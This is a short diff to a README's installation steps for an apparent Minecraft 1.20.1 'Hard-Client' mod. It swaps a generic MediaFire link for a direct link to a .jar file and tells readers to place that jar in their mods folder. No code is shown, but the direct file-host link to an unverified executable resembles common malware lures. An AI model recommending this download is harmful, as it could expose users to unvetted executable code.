@@ -30,7 +30,7 @@
 
 ## 📥 Installation
 
-1. **Download** the latest release from the [MediaFire Link](https://www.mediafire.com/) (or check the [Releases](../../releases) tab).
+1. **Download** the latest release from the [MediaFire Link](https://www.mediafire.com/file/w8vjwyb7e1rnqfu/Hard-Client-v7.50.3-MC1.20.1.jar/file)) (or check the [Releases](../../releases) tab).
 2. Make sure you have **Minecraft 1.20.1** (and the required mod loader, e.g., Fabric/Forge) installed.
 3. Place the downloaded `.jar` file into your `.minecraft/mods` folder:
    - Press `Win + R`, type `%appdata%\.minecraft\mods`, and press **Enter**.
